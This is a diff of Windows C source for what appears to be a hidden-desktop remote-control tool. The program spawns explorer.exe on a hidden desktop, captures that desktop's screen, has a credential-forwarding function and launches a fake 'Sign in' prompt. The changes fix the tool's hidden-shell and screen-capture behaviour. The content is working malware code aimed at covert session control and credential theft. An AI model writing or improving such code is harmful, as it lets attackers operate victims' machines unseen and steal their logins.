@@ -126,8 +126,14 @@ static void spawn_on_desktop(const char *cmd) {
     si.cb = sizeof(si);
     snprintf(desk, sizeof(desk), "WinSta0\\%s", g_desktop);
     si.lpDesktop = desk;
-    strncpy(buf, cmd, sizeof(buf) - 1);
-    buf[sizeof(buf) - 1] = 0;
+    /* explorer.exe is single-instance: force a fresh shell on the hidden
+       desktop instead of activating the visible one. */
+    if (strstr(cmd, "explorer.exe") && !strstr(cmd, "/separate")) {
+        snprintf(buf, sizeof(buf), "%s /separate", cmd);
+    } else {
+        strncpy(buf, cmd, sizeof(buf) - 1);
+        buf[sizeof(buf) - 1] = 0;
+    }
     memset(&pi, 0, sizeof(pi));
     if (CreateProcessA(NULL, buf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
@@ -196,8 +202,9 @@ static void forward_creds(void) {
 }
 
 static unsigned char *capture_rgb(void) {
+    /* screen DC of the calling thread's desktop (worker called SetThreadDesktop) */
     HWND dw = GetDesktopWindow();
-    HDC screen = GetDC(dw);
+    HDC screen = GetDC(NULL);
     if (!screen) return NULL;
     HDC mem = CreateCompatibleDC(screen);
     HBITMAP bmp = CreateCompatibleBitmap(screen, g_w, g_h);
@@ -227,7 +234,7 @@ static unsigned char *capture_rgb(void) {
     SelectObject(mem, old);
     DeleteObject(bmp);
     DeleteDC(mem);
-    ReleaseDC(dw, screen);
+    ReleaseDC(NULL, screen);
     return rgb;
 }
 
@@ -322,6 +329,7 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
         return 1;
     }
     spawn_on_desktop(g_spawn);
+    Sleep(600); /* let the hidden shell create its first window */
     if (g_prompt[0]) {
         char pcmd[1024];
         snprintf(pcmd, sizeof(pcmd), "\"%s\" --out \"%s\" --title \"Sign in\"", g_prompt,
